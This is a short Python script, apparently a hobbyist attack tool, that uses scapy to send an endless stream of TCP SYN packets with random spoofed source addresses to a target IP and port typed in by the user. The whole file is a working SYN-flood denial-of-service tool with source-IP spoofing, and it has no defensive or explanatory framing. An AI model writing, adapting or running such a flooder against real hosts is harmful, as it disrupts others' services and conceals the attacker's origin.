from scapy.all import *
import random
import time

def randomip():
    ip1=random.randint(1,255)
    ip2=random.randint(1,255)
    ip3=random.randint(1,255)
    ip4=random.randint(1,255)
    ip=str(ip1)+'.'+str(ip2)+'.'+str(ip3)+'.'+str(ip4)
    return ip

def randomport():
    return random.randint(1,65535)

address=input("enter ip address of webserver or any ")
port=int(input("enter port of that webserver or ccomputer"))



while True:

    ip=IP()
    ip.src=randomip()
    ip.dst=address


    tcp=TCP()
    tcp.sport=randomport()
    tcp.dport=port
    tcp.flag='S'

    a,u=sr(ip/tcp,timeout=0.2)
    print("packet sent successfully from ",ip.src," to ",address)
    #print(u.summary())
    time.sleep(0.2)
